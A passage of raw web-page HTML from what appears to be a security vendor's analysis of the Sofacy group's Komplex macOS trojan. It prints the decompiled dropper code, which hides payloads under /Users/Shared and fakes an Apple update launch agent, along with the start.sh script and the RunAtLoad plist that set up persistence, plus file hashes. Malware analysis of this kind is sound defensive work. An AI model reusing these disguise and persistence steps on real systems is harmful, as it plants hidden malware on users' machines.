class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-i">launch</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_70 </span><span class="crayon-i">waitUntilExit</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-i">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span>*<span class="crayon-i">arg1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_28 </span><span class="crayon-i">release</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f45219750911-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f45219750911-24"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>1</em><em> Main function within the Komplex binder</em></p>
<p style="text-align: left;">The binder component saves a decoy document named roskosmos_2015-2025.pdf to the system and opens it using the Preview application built into OS X. Figure 2 shows a portion of the 17 page decoy document. This document is titled “Проект Федеральной космической программы России на 2016 - 2025 годы” and describes the Russian Federal Space Program’s projects between 2016 and 2025. We do not have detailed targeting information regarding the  Sofacy group's attack campaign delivering Komplex at this time; however, based on the contents of the decoy document, we believe that the target is likely associated with the aerospace industry.</p>
<p style="text-align: left;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_1.png" rel="wpdevart_lightbox"><img  class="size-large wp-image-19703 aligncenter lozad"  data-src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_1-500x391.png" alt="sofacy_1" width="500" height="391" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>2</em><em> Decoy document opened by Komplex binder showing document regarding the Russian Space Program</em></p>
<h3>Komplex Dropper</h3>
<p>The Komplex dropper component is saved to the system as “/tmp/content” (SHA256: 96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3) and is responsible for installing a third executable to the system and setting up persistence for the third executable to launch each time the OS X operating system starts. This dropper also provided the basis for the name “Komplex”, which is seen in several folder paths that were included within the Mach-O file, such as “/Users/kazak/Desktop/Project/komplex".</p>
<p>The Komplex dropper is fairly straightforward from a functional perspective, as it contains all of its functionality within its “_main” function. The “_main” function (Figure 3) accesses data within three variables named ‘_Payload_1’, ‘_Payload_2’ and ‘_Payload_3’, and writes them to three files on the system.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f48355555649" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int _main(int arg0, int arg1) {
    var_38 = [[NSAutoreleasePool alloc] init];
    var_40 = [NSData dataWithBytes:_Payload_1 length:0x15c1c];
    var_48 = [NSData dataWithBytes:_Payload_2 length:0x201];
    var_50 = [NSData dataWithBytes:_Payload_3 length:0x4c];
    system("mkdir -p /Users/Shared/.local/ &amp;&gt; /dev/null");
    system("mkdir -p ~/Library/LaunchAgents/ &amp;&gt; /dev/null");
    [var_40 writeToFile:@"/Users/Shared/.local/kextd" atomically:0x1];
    [var_48 writeToFile:@"/Users/Shared/com.apple.updates.plist" 
atomically:0x1];
    [var_50 writeToFile:@"/Users/Shared/start.sh" atomically:0x1];
    system("cp /Users/Shared/com.apple.updates.plist 
$HOME/Library/LaunchAgents/  &amp;&gt;/dev/null");
    remove("/Users/Shared/com.apple.updates.plist");
    system("chmod 755 /Users/Shared/.local/kextd");
    system("chmod 755 /Users/Shared/start.sh");
    var_58 = [[NSTask alloc] init];
    [var_58 setLaunchPath:@"/Users/Shared/start.sh"];
    [var_58 launch];
    [var_58 waitUntilExit];
    remove("/Users/Shared/start.sh");
    remove(*arg1);
    [var_38 release];
    return 0x0;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-12">12</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-14">14</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-16">16</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-18">18</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-20">20</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-22">22</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f48355555649-24">24</div><div class="crayon-num" data-line="crayon-67d4f94a16f48355555649-25">25</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f48355555649-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">_main</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">arg0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-i">arg1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_38</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSAutoreleasePool </span><span class="crayon-i">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_40</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithBytes</span><span class="crayon-sy">:</span><span class="crayon-e">_Payload_1 </span><span class="crayon-i">length</span><span class="crayon-sy">:</span><span class="crayon-cn">0x15c1c</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_48</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithBytes</span><span class="crayon-sy">:</span><span class="crayon-e">_Payload_2 </span><span class="crayon-i">length</span><span class="crayon-sy">:</span><span class="crayon-cn">0x201</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_50</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-i">dataWithBytes</span><span class="crayon-sy">:</span><span class="crayon-e">_Payload_3 </span><span class="crayon-i">length</span><span class="crayon-sy">:</span><span class="crayon-cn">0x4c</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"mkdir -p /Users/Shared/.local/ &amp;&gt; /dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"mkdir -p ~/Library/LaunchAgents/ &amp;&gt; /dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_40 </span><span class="crayon-i">writeToFile</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/.local/kextd"</span><span class="crayon-h"> </span><span class="crayon-i">atomically</span><span class="crayon-sy">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_48 </span><span class="crayon-i">writeToFile</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/com.apple.updates.plist"</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-10"><span class="crayon-i">atomically</span><span class="crayon-sy">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_50 </span><span class="crayon-i">writeToFile</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-h"> </span><span class="crayon-i">atomically</span><span class="crayon-sy">:</span><span class="crayon-cn">0x1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"cp /Users/Shared/com.apple.updates.plist </span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-13"><span class="crayon-s">$HOME/Library/LaunchAgents/&nbsp;&nbsp;&amp;&gt;/dev/null"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-s">"/Users/Shared/com.apple.updates.plist"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /Users/Shared/.local/kextd"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">system</span><span class="crayon-sy">(</span><span class="crayon-s">"chmod 755 /Users/Shared/start.sh"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_58</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSTask </span><span class="crayon-i">alloc</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-i">init</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-i">setLaunchPath</span><span class="crayon-sy">:</span><span class="crayon-sy">@</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-i">launch</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_58 </span><span class="crayon-i">waitUntilExit</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span><span class="crayon-s">"/Users/Shared/start.sh"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">remove</span><span class="crayon-sy">(</span>*<span class="crayon-i">arg1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">[</span><span class="crayon-e">var_38 </span><span class="crayon-i">release</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f48355555649-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f48355555649-25"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>3</em><em> Komplex Dropper's main function that drops three files to the system and runs a shell script</em></p>
<p>The “_main” function writes the data within ‘_Payload_1’, ‘_Payload_2’, and ‘_Payload_3’ variables to the following files, respectively:</p>
<ol>
<li>/Users/Shared/.local/kextd (SHA256:<br />
227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5)</li>
<li>/Users/Shared/com.apple.updates.plist (SHA256:<br />
1f22e8f489abff004a3c47210a9642798e1c53efc9d6f333a1072af4b11d71ef)</li>
<li>/Users/Shared/start.sh (SHA256:<br />
d494e9f885ad2d6a2686424843142ddc680bb5485414023976b4d15e3b6be800)</li>
</ol>
<p>The shell script saved to ‘/Users/Shared/start.sh’ calls the system command ‘launchctl’ to add a plist entry into ‘launchd’ to automatically execute the Komplex payload each time the system starts. Figure 4 shows the contents of the ‘start.sh’ script that sets up persistence for the payload.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f4b560534775" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#!/bin/sh
launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f4b560534775-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4b560534775-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f4b560534775-1"><span class="crayon-p">#!/bin/sh</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4b560534775-2"><span class="crayon-e">launchctl </span><span class="crayon-i">load</span><span class="crayon-h"> </span>-<span class="crayon-i">w</span><span class="crayon-h"> </span><span class="crayon-sy">~</span>/<span class="crayon-i">Library</span>/<span class="crayon-i">LaunchAgents</span>/<span class="crayon-i">com</span><span class="crayon-sy">.</span><span class="crayon-i">apple</span><span class="crayon-sy">.</span><span class="crayon-i">updates</span><span class="crayon-sy">.</span><span class="crayon-i">plist</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>4</em><em> Contents of the start.sh shell script that calls launchctl</em></p>
<p>The ‘start.sh’ script loads ‘com.apple.updates.plist’, which sets the properties of the Komplex payload that is executed from “/Users/Shared/.local/kextd” at system start up courtesy of the “RunAtLoad” parameter.  Figure 5 shows the contents of the ‘com.apple.updates.plist’ file loaded into ‘launchd’.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f4d346410185" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
	&lt;key&gt;Label&lt;/key&gt;
	&lt;string&gt;com.apple.updates&lt;/string&gt;
	&lt;key&gt;ProgramArguments&lt;/key&gt;
	&lt;array&gt;
		&lt;string&gt;/Users/Shared/.local/kextd&lt;/string&gt;
	&lt;/array&gt;
	&lt;key&gt;KeepAlive&lt;/key&gt;
	&lt;false/&gt;
	&lt;key&gt;RunAtLoad&lt;/key&gt;
	&lt;true/&gt;
	&lt;key&gt;StandardErrorPath&lt;/key&gt;
	&lt;string&gt;/dev/null&lt;/string&gt;
	&lt;key&gt;StandardOutPath&lt;/key&gt;
	&lt;string&gt;/dev/null&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-2">2</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-4">4</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-6">6</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-8">8</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-10">10</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-12">12</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-14">14</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-16">16</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-18">18</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f4d346410185-20">20</div><div class="crayon-num" data-line="crayon-67d4f94a16f4d346410185-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-1"><span class="crayon-ta">&lt;?</span><span class="crayon-e">xml </span><span class="crayon-i">version</span>=<span class="crayon-s">"1.0"</span><span class="crayon-h"> </span><span class="crayon-i">encoding</span>=<span class="crayon-s">"UTF-8"</span><span class="crayon-ta">?&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-2"><span class="crayon-h">&lt;</span><span class="crayon-sy">!</span><span class="crayon-e">DOCTYPE </span><span class="crayon-e">plist </span><span class="crayon-m">PUBLIC</span><span class="crayon-h"> </span><span class="crayon-s">"-//Apple//DTD PLIST 1.0//EN"</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-3"><span class="crayon-s">"http://www.apple.com/DTDs/PropertyList-1.0.dtd"</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-4"><span class="crayon-h">&lt;</span><span class="crayon-e">plist </span><span class="crayon-i">version</span>=<span class="crayon-s">"1.0"</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-5"><span class="crayon-h">&lt;</span><span class="crayon-i">dict</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-6"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">Label</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-7"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">string</span><span class="crayon-h">&gt;</span><span class="crayon-i">com</span><span class="crayon-sy">.</span><span class="crayon-i">apple</span><span class="crayon-sy">.</span><span class="crayon-i">updates</span><span class="crayon-h">&lt;</span>/<span class="crayon-t">string</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-8"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">ProgramArguments</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-9"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-t">array</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-10"><span class="crayon-h">		</span><span class="crayon-h">&lt;</span><span class="crayon-t">string</span><span class="crayon-h">&gt;</span>/<span class="crayon-i">Users</span>/<span class="crayon-i">Shared</span>/<span class="crayon-sy">.</span><span class="crayon-i">local</span>/<span class="crayon-i">kextd</span><span class="crayon-h">&lt;</span>/<span class="crayon-t">string</span><span class="crayon-h">&gt;</span></div><div class="crayon-line" id="crayon-67d4f94a16f4d346410185-11"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span>/<span class="crayon-t">array</span><span class="crayon-h">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f4d346410185-12"><span class="crayon-h">	</span><span class="crayon-h">&lt;</span><span class="crayon-i">key</span><span class="crayon-h">&gt;</span><span class="crayon-i">KeepAlive</span><span class="crayon-h">&lt;</span>/<span class="crayon-i">key</span><span 